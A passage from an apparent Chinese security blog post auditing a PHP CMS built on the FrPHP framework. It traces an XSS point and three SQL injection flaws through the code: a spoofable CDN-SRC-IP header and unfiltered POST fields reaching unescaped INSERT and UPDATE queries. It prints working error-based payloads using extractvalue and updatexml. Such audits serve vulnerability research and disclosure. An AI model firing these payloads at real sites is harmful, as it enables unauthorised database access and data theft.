class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">,cols: [[ //表头</span><br><span class="line">  &#123;field: 'id', title: 'ID', width:50, sort: true, fixed:'left'&#125;</span><br><span class="line">  ,&#123;type:'checkbox'&#125;</span><br><span class="line">  ,&#123;field: 'isshow', title: '状态',width: 100,templet:'#isshow'&#125;</span><br><span class="line">  ,&#123;field: 'username', title: '用户名',width: 150, sort: true&#125;</span><br><span class="line">  ,&#123;field: 'new_gid', title: '分组',width:150&#125;</span><br><span class="line">  ,&#123;field: 'tel', title: '手机号',width:200,  sort: true&#125;</span><br><span class="line">  ,&#123;field: 'email', title: '邮箱',width:150,  sort: true&#125;</span><br><span class="line">  ,&#123;field: 'new_litpic', title: '头像',width:150&#125; </span><br><span class="line">  ,&#123;field: 'jifen', title: '积分',width:150&#125; </span><br><span class="line">  ,&#123;field: 'money', title: '余额',width:150&#125; </span><br><span class="line">  &#123;foreach $fields_list as $v&#125;,&#123;field: '&#123;$v['field']&#125;',width:150, title: '&#123;$v['fieldname']&#125;'&#125;&#123;/foreach&#125;</span><br><span class="line"> </span><br><span class="line">  ,&#123;field: 'new_regtime', title: '加入时间',width:160&#125;</span><br><span class="line">  ,&#123;field: 'new_logintime', title: '登录时间',width:160&#125;</span><br><span class="line">  &#123;if(checkAction('Member/memberedit') || checkAction('Member/member_del'))&#125;</span><br><span class="line">  ,&#123;field: '', title: '操作',width:260, toolbar: '#rightbar', fixed:'right'&#125;</span><br><span class="line">  &#123;/if&#125;</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20200521163150.png" alt="image-20200521163150807"></p><p>这里也是可以打cookie的，跟上述一样，为了演示方便就选择了弹窗<br><img src="http://images.xianyu123.club/20200521163200.png" alt="image-20200521163200869"></p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="第一处sql注入"><a href="#第一处sql注入" class="headerlink" title="第一处sql注入"></a>第一处sql注入</h2><p><code>/Home/c/MessageController.php</code>中的index方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST)&#123;</span><br><span class="line"></span><br><span class="line">$w = <span class="keyword">$this</span>-&gt;frparam();</span><br><span class="line">$w = get_fields_data($w,<span class="string">'message'</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$w[<span class="string">'body'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'body'</span>,<span class="number">1</span>,<span class="string">''</span>,<span class="string">'POST'</span>);</span><br><span class="line">$w[<span class="string">'user'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'user'</span>,<span class="number">1</span>,<span class="string">''</span>,<span class="string">'POST'</span>);</span><br><span class="line">$w[<span class="string">'tel'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'tel'</span>,<span class="number">1</span>,<span class="string">''</span>,<span class="string">'POST'</span>);</span><br><span class="line">$w[<span class="string">'aid'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'aid'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">'POST'</span>);</span><br><span class="line">$w[<span class="string">'tid'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'tid'</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">'POST'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;webconf[<span class="string">'autocheckmessage'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">$w[<span class="string">'isshow'</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$w[<span class="string">'isshow'</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w[<span class="string">'ip'</span>] = GetIP();</span><br><span class="line">$w[<span class="string">'addtime'</span>] = time();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'member'</span>]))&#123;</span><br><span class="line">$w[<span class="string">'userid'</span>] = $_SESSION[<span class="string">'member'</span>][<span class="string">'id'</span>];</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这里第20行<code>$w[&#39;ip&#39;] = GetIP();</code>，然后我们回溯，去找到<code>GetIP()</code>函数</p><p><code>/FrPHP/common/Functions.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123; </span><br><span class="line">  <span class="keyword">static</span> $ip = <span class="string">''</span>;</span><br><span class="line">  $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CDN_SRC_IP'</span>])) &#123;</span><br><span class="line">    $ip = $_SERVER[<span class="string">'HTTP_CDN_SRC_IP'</span>];</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>]) &amp;&amp; preg_match(<span class="string">'/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/'</span>, $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>])) &#123;</span><br><span class="line">    $ip = $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];</span><br><span class="line">  &#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) <span class="keyword">AND</span> preg_match_all(<span class="string">'#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s'</span>, $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>], $matches)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($matches[<span class="number">0</span>] <span class="keyword">AS</span> $xip) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!preg_match(<span class="string">'#^(10|172\.16|192\.168)\.#'</span>, $xip)) &#123;</span><br><span class="line">        $ip = $xip;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里第5行并没有对<code>$_SERVER[&#39;HTTP_CDN_SRC_IP&#39;]</code>进行过滤，我们只需要在http头中传入<code>CDN-SRC-IP</code>字段即可</p><p>我们可以本地对该函数进行输出，是可以传入任意字符的，上面的xss漏洞处已经做过演示了，这里就不再重复赘述了。</p><p>然后我们继续跟进，在<code>/Home/c/MessageController.php</code>中的第76行<code>$res = M(&#39;message&#39;)-&gt;add($w);</code>，这个<code>add</code>方法是<code>Frphp</code>框架的一个插入数据表的方法</p><p><code>/FrPHP/lib/Model.php</code>中的add方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新增数据</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($row)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(!is_array($row))<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">$row = <span class="keyword">$this</span>-&gt;__prepera_format($row);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($row))<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line"><span class="keyword">foreach</span>($row <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line"><span class="keyword">if</span>($value!==<span class="keyword">null</span>)&#123;</span><br><span class="line">$cols[] = $key;</span><br><span class="line">$vals[] = <span class="string">'\''</span>.$value.<span class="string">'\''</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$col = join(<span class="string">','</span>, $cols);</span><br><span class="line">$val = join(<span class="string">','</span>, $vals);</span><br><span class="line">$table = <span class="keyword">self</span>::$table;</span><br><span class="line">$sql = <span class="string">"INSERT INTO &#123;$table&#125; (&#123;$col&#125;) VALUES (&#123;$val&#125;)"</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">FALSE</span> != <span class="keyword">$this</span>-&gt;runSql($sql) )&#123;</span><br><span class="line"><span class="keyword">if</span>( $newinserid = <span class="keyword">$this</span>-&gt;db-&gt;lastInsertId() )&#123;</span><br><span class="line"><span class="keyword">return</span> $newinserid;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$a=<span class="keyword">$this</span>-&gt;find($row, <span class="string">"&#123;$this-&gt;primary&#125; DESC"</span>,<span class="keyword">$this</span>-&gt;primary);</span><br><span class="line"><span class="keyword">return</span> array_pop($a);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>显然，第10行的<code>$value</code>我们可控（前面的ip可控），而且这里也并没有对插入数据表的数据进行过滤，所以这里存在sql注入，这里可以直接进行报错注入</p><p>查询当前用户payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&apos; and extractvalue(0x0a,concat(0x0a,(select user()))) and &apos;1</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20200603134921.png" alt="image-20200603134921844"></p><h2 id="第二处sql注入"><a href="#第二处sql注入" class="headerlink" title="第二处sql注入"></a>第二处sql注入</h2><p><code>/Home/c/UserController.php</code>中的<code>release</code>方法中的关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文章发布和修改</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">release</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checklogin();</span><br><span class="line">    error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_POST)&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;frparam();</span><br><span class="line">........</span><br><span class="line">........</span><br><span class="line">........</span><br><span class="line">$w[<span class="string">'tid'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'tid'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$w[<span class="string">'tid'</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">                JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'msg'</span>=&gt;<span class="string">'请选择分类！'</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                Error(<span class="string">'请选择分类！'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">      $w[<span class="string">'molds'</span>] = <span class="keyword">$this</span>-&gt;classtypedata[$w[<span class="string">'tid'</span>]][<span class="string">'molds'</span>];</span><br><span class="line">      $w = get_fields_data($data,$w[<span class="string">'molds'</span>]);</span><br><span class="line">........</span><br><span class="line">........</span><br><span class="line">........</span><br><span class="line">          <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'id'</span>))&#123;</span><br><span class="line">            $a = M($w[<span class="string">'molds'</span>])-&gt;update([<span class="string">'id'</span>=&gt;<span class="keyword">$this</span>-&gt;frparam(<span class="string">'id'</span>)],$w);</span><br></pre></td></tr></table></figure><p>上述代码第7行<code>$data = $this-&gt;frparam()</code>，<code>frparam()</code>方法前面已经提过了，这里就不再累赘重复了</p><p>这里是用来接收值的，如果是post传输的，就接收所有post的值，并且不进行过滤。</p><p>然后第11行代码<code>$w[&#39;tid&#39;] = $this-&gt;frparam(&#39;tid&#39;);</code>，这里会接收参数名为<code>tid</code>的值，并且会进行<code>return (int)$value;</code>处理，这样传入<code>1&#39;</code>就不行了，但是没关系，我们接着看第21行<code>$w = get_fields_data($data,$w[&#39;molds&#39;]);</code>，我们回溯一下<code>get_fields_data()</code>方法</p><p><code>/Conf/Functions.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_fields_data</span><span class="params">($data,$molds,$isadmin=<span class="number">1</span>)</span></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>($isadmin)&#123;</span><br><span class="line"> $fields = M(<span class="string">'fields'</span>)-&gt;findAll([<span class="string">'molds'</span>=&gt;$molds,<span class="string">'isadmin'</span>=&gt;<span class="number">1</span>],<span class="string">'orders desc,id asc'</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="comment">//前台需要判断是否前台显示</span></span><br><span class="line"> $fields = M(<span class="string">'fields'</span>)-&gt;findAll([<span class="string">'molds'</span>=&gt;$molds,<span class="string">'isshow'</span>=&gt;<span class="number">1</span>],<span class="string">'orders desc,id asc'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">foreach</span>($fields <span class="keyword">as</span> $v)&#123;</span><br><span class="line"> <span class="keyword">if</span>(array_key_exists($v[<span class="string">'field'</span>],$data))&#123;</span><br><span class="line"> <span class="keyword">switch</span>($v[<span class="string">'fieldtype'</span>])&#123;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"> <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"> <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"> <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"> <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line"> <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line"> $data[$v[<span class="string">'field'</span>]] = format_param($data[$v[<span class="string">'field'</span>]],<span class="number">1</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line"> $data[$v[<span class="string">'field'</span>]] = strtotime(format_param($data[$v[<span class="string">'field'</span>]],<span class="number">1</span>));</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"> $data[$v[<span class="string">'field'</span>]] = format_param($data[$v[<span class="string">'field'</span>]],<span class="number">4</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"> <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line"> $data[$v[<span class="string">'field'</span>]] = format_param($data[$v[<span class="string">'field'</span>]]);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line"> $data[$v[<span class="string">'field'</span>]] = format_param($data[$v[<span class="string">'field'</span>]],<span class="number">3</span>);</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line"> $r = implode(<span class="string">','</span>,format_param($data[$v[<span class="string">'field'</span>]],<span class="number">2</span>));</span><br><span class="line"> <span class="keyword">if</span>($r!=<span class="string">''</span>)&#123;</span><br><span class="line"> $r = <span class="string">','</span>.$r.<span class="string">','</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"> $data[$v[<span class="string">'field'</span>]] = $r;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(array_key_exists($v[<span class="string">'field'</span>].<span class="string">'_urls'</span>,$data))&#123;</span><br><span class="line">     <span class="keyword">switch</span>($v[<span class="string">'fieldtype'</span>])&#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"> <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"> $data[$v[<span class="string">'field'</span>]] = implode(<span class="string">'||'</span>,format_param($data[$v[<span class="string">'field'</span>].<span class="string">'_urls'</span>],<span class="number">2</span>));</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     </span><br><span class="line">$data[$v[<span class="string">'field'</span>]] = <span class="string">''</span>;      </span><br><span class="line">     </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> $data;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们不是admin，所以我们会执行第6行代码<code>$fields = M(&#39;fields&#39;)-&gt;findAll([&#39;molds&#39;=&gt;$molds,&#39;isshow&#39;=&gt;1],&#39;orders desc,id asc&#39;);</code></p><p>这里我post传入参数，简单的debug了一下，如下</p><p><img src="http://images.xianyu123.club/20200522210658.png" alt="2020-05-22_21-02-37"></p><p>所以上述代码<code>$fields[&#39;field&#39;]</code>是不存在的，所以只会执行第51行代码<code>$data[$v[&#39;field&#39;]] = &#39;&#39;;</code>，所以第56行返回的代码就是<code>$data = $this-&gt;frparam();</code>，这也就解释了为什么中间对<code>tip</code>进行过滤，但为什么最后依然还是存在注入，这应该是个严重的开发失误。</p><p>然后我们接着回溯<code>update()</code>方法</p><p><code>/FrPHP/lib/Model.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 修改数据</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($conditions,$row)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      $where = <span class="string">""</span>;</span><br><span class="line">$row = <span class="keyword">$this</span>-&gt;__prepera_format($row);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($row))<span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line"><span class="keyword">if</span>(is_array($conditions))&#123;</span><br><span class="line">$join = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>( $conditions <span class="keyword">as</span> $key =&gt; $condition )&#123;</span><br><span class="line">$condition = <span class="string">'\''</span>.$condition.<span class="string">'\''</span>;</span><br><span class="line">$join[] = <span class="string">"&#123;$key&#125; = &#123;$condition&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$where = <span class="string">"WHERE "</span>.join(<span class="string">" AND "</span>,$join);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">null</span> != $conditions)$where = <span class="string">"WHERE "</span>.$conditions;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($row <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line"><span class="keyword">if</span>($value!==<span class="keyword">null</span>)&#123;</span><br><span class="line">$value = <span class="string">'\''</span>.$value.<span class="string">'\''</span>;</span><br><span class="line">$vals[] = <span class="string">"&#123;$key&#125; = &#123;$value&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$vals[] = <span class="string">"&#123;$key&#125; = null"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$values = join(<span class="string">", "</span>,$vals);</span><br><span class="line">$table = <span class="keyword">self</span>::$table;</span><br><span class="line">$sql = <span class="string">"UPDATE &#123;$table&#125; SET &#123;$values&#125; &#123;$where&#125;"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;runSql($sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>/Home/c/UserController.php</code>关键代码中的第25-26行，虽然25行<code>if($this-&gt;frparam(&#39;id&#39;))</code>对<code>id</code>进行了过滤，但是第26行<code>$a = M($w[&#39;molds&#39;])-&gt;update([&#39;id&#39;=&gt;$this-&gt;frparam(&#39;id&#39;)],$w);</code>这里<code>update</code>插入的是最原始的数据，，=也就是<code>$w = get_fields_data($data,$w[&#39;molds&#39;]);</code>。虽然<code>$conditions</code>也就是条件被过滤了，但是不影响我们注入。</p><p>所以这里的<code>id</code>，<code>molds</code> ，<code>tid</code>三个字段都存在sql注入</p><p><img src="http://images.xianyu123.club/20200603192033.png" alt="image-20200603192033126"></p><p><img src="http://images.xianyu123.club/20200603192126.png" alt="image-20200603192126101"></p><p><img src="http://images.xianyu123.club/20200603192208.png" alt="image-20200603192207996"></p><h2 id="第三处sql注入"><a href="#第三处sql注入" class="headerlink" title="第三处sql注入"></a>第三处sql注入</h2><p><code>/Home/c/UserController.php</code>中的<code>userinfo()</code>方法中的关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">userinfo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;checklogin();</span><br><span class="line"><span class="keyword">if</span>($_POST)&#123;</span><br><span class="line">$w = <span class="keyword">$this</span>-&gt;frparam();</span><br><span class="line">$w[<span class="string">'tel'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'tel'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'pass'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'password'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'sex'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'sex'</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">$w[<span class="string">'repass'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'repassword'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'username'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'username'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'email'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'email'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'litpic'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'litpic'</span>,<span class="number">1</span>);</span><br><span class="line">$w[<span class="string">'signature'</span>] = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'signature'</span>,<span class="number">1</span>);</span><br><span class="line">$w = get_fields_data($w,<span class="string">'member'</span>,<span class="number">0</span>);</span><br><span class="line">........</span><br><span class="line">........</span><br><span class="line">........</span><br><span class="line">$re = M(<span class="string">'member'</span>)-&gt;update([<span class="string">'id'</span>=&gt;<span class="keyword">$this</span>-&gt;member[<span class="string">'id'</span>]],$w);</span><br><span class="line">$member = M(<span class="string">'member'</span>)-&gt;find([<span class="string">'id'</span>=&gt;<span class="keyword">$this</span>-&gt;member[<span class="string">'id'</span>]]);</span><br><span class="line"><span class="keyword">unset</span>($member[<span class="string">'pass'</span>]);</span><br><span class="line">$_SESSION[<span class="string">'member'</span>] = array_merge($_SESSION[<span class="string">'member'</span>],$member);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'ajax'</span>))&#123;</span><br><span class="line">JsonReturn([<span class="string">'code'</span>=&gt;<span class="number">0</span>,<span class="string">'msg'</span>=&gt;<span class="string">'修改成功！'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">Error(<span class="string">'修改成功！'</span>);</span><br></pre></td></tr></table></figure><p>这里我们对比一下我post抓包后的字段，我们发现有3个字段没有进行过滤，分别是<code>province</code>、<code>city</code>、<code>address</code>这三个字段</p><p><img src="http://images.xianyu123.club/20200521224630.png" alt="image-20200521224630806"></p><p>然后第17行<code>$re = M(&#39;member&#39;)-&gt;update([&#39;id&#39;=&gt;$this-&gt;member[&#39;id&#39;]],$w);</code>所有字段依旧被<code>update</code>更新了，所以这里就存在了注入，还是一个报错注入，如果不回显报错也没有关系的，这里存在时间盲注，也是可以注入的</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &apos;</span><br></pre></td></tr></table></figure><p><code>province</code>字段演示</p><p><img src="http://images.xianyu123.club/20200521225451.png" alt="image-20200521225451412"></p><p><code>city</code>字段演示</p><p><img src="http://images.xianyu123.club/20200521225648.png" alt="image-20200521225648455"></p><p><code>address</code>字段演示</p><p><img src="http://images.xianyu123.club/20200521225746.png" 